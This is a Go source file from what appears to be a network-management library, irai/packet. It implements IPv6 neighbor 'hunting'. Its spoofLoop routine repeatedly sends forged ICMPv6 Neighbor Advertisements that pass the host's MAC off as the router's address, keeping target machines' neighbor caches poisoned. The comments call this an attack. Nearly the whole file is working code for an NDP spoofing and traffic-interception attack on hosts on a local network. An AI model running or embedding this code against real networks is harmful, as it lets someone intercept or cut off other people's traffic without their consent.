package icmp

import (
	"fmt"
	"math/rand"
	"time"

	"github.com/irai/packet"
	"github.com/irai/packet/fastlog"
)

// StartHunt implements packet processor interface
//
// Hunt IPv6 LLA only; return error if IP is not IP6 Local Link Address
// If IP is nil, we use unicast ethernet address but multicast ip address to get the packet to the target
func (h *Handler6) StartHunt(addr packet.Addr) (packet.HuntStage, error) {
	if Debug {
		fmt.Printf("icmp6 : start neighbor hunt %s\n", addr)
	}
	if addr.IP.IsValid() && !addr.IP.IsLinkLocalUnicast() {
		return packet.StageNoChange, nil
	}
	h.Lock()
	if h.huntList.Index(addr.MAC) != -1 {
		h.Unlock()
		return packet.StageHunt, nil
	}
	h.huntList.Add(addr)
	h.Unlock()

	go h.spoofLoop(addr)

	return packet.StageHunt, nil
}

// StopHunt implements PacketProcessor interface
func (h *Handler6) StopHunt(addr packet.Addr) (packet.HuntStage, error) {
	if Debug {
		fmt.Printf("icmp6 : stop neighbor hunt %s\n", addr)
	}
	if addr.IP.IsValid() && !addr.IP.IsLinkLocalUnicast() {
		return packet.StageNoChange, nil
	}
	h.Lock()
	h.huntList.Del(addr)
	h.Unlock()
	return packet.StageNormal, nil
}

// spoofLoop attacks the client with neighbor advertisement attacks
//
// It will continuously send a number of NA packets to client until the mac is no longer in hunt list.
func (h *Handler6) spoofLoop(dstAddr packet.Addr) {
	rand.Seed(time.Now().UnixNano())
	startTime := time.Now()
	nTimes := 0

	// if no IP, then use unicast Ether address and multicast IP to get packet to destination
	if !dstAddr.IP.IsValid() {
		dstAddr.IP = packet.IP6AllNodesMulticast
	}
	// fmt.Printf("icmp6 : na attack %s time=%v\n", dstAddr, startTime)
	fastlog.NewLine(module6, "NA attack start").Struct(dstAddr).Time("time", startTime).Write()
	for {
		h.Lock()

		if h.huntList.Index(dstAddr.MAC) == -1 || h.closed {
			h.Unlock()
			// fmt.Printf("icmp6 : attack end %s repeat=%v duration=%v\n", dstAddr, nTimes, time.Since(startTime))
			fastlog.NewLine(module6, "NA attack end").Struct(dstAddr).Int("repeat", nTimes).Duration("duration", time.Since(startTime)).Write()
			return
		}

		// Attack when we have the router LLA only
		if h.Router != nil {
			list := []packet.Addr{}
			for _, router := range h.LANRouters {
				list = append(list, router.Addr)
			}

			h.Unlock()

			for _, routerAddr := range list {
				hostAddr := packet.Addr{MAC: h.session.NICInfo.HostAddr4.MAC, IP: h.session.NICInfo.HostLLA.Addr()}
				targetAddr := packet.Addr{MAC: h.session.NICInfo.HostAddr4.MAC, IP: routerAddr.IP}
				fakeRouter := packet.Addr{MAC: hostAddr.MAC, IP: routerAddr.IP}

				if err := h.session.ICMP6SendNeighborAdvertisement(fakeRouter, dstAddr, targetAddr); err != nil {
					fmt.Println("icmp6 : error sending na ", err)
				}

				/* no need to send this - May 21
				if err := h.SendNeighbourSolicitation(fakeRouter, dst, dstAddr.IP); err != nil {
					fmt.Println("icmp6 : error sending na ", err)
				}
				*/

				if nTimes%16 == 0 {
					// fmt.Printf("icmp6 : attack src %s dst %s target %s repeat=%v duration=%v\n", hostAddr, dstAddr, targetAddr, nTimes, time.Since(startTime))
					fastlog.NewLine(module6, "NA attack src").Struct(hostAddr).Label("dst").Struct(dstAddr).Label("target").Struct(targetAddr).
						Int("repeat", nTimes).Duration("duration", time.Since(startTime)).Write()
				}
				nTimes++

				/**
					// spoof router
					if !dstAddr.IP.Equal(packet.IP6AllNodesMulticast) { // dont spoof router if we don't know the IPv6
					targetAddr.IP = dstAddr.IP
					if err := h.SendNeighborAdvertisement(host, routerAddr, targetAddr); err != nil {
						fmt.Println("icmp6 : error sending na ", err)
					}
				}
				*/
			}
		} else {
			h.Unlock()
			if nTimes%64 == 0 {
				fmt.Printf("icmp6 : na attack failed - missing router LLA %s\n", dstAddr)
			}
			nTimes++
		}

		select {
		case <-h.closeChan:
			// Tplink home router send RA every 3 seconds
			// Note: when processing a RA message, we close the channel to wakeup all go routines and
			//       closeChan will be set to a new channel.

		case <-time.After(time.Millisecond*2000 + time.Duration(rand.Int31n(800))):
			// 2 second spoof seem to be adequate to keep cache poisoned
		}
	}
}
